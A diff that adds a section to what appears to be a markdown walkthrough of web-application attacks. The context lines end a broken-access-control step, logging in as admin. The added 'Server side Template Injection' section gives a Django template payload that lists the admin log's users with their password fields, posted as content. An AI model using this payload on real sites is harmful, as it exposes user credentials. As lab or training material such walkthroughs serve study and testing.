@@ -417,3 +417,14 @@ Then Change the user Agent Field.
 This results as being logged in as Admin
 
 ![brokenaccess25](https://user-images.githubusercontent.com/70275323/163707622-8cb3f1d7-2185-43b1-84c1-0c66591bc2f6.png)
+
+
+**Server side Template Injection**
+
+`{% load log %}
+{% get_admin_log 5 as log %}
+{% for e in log %}
+    {{e.user.get_username}} : {{e.user.password}}
+{% endfor %}`
+
+add a post which includes this content 
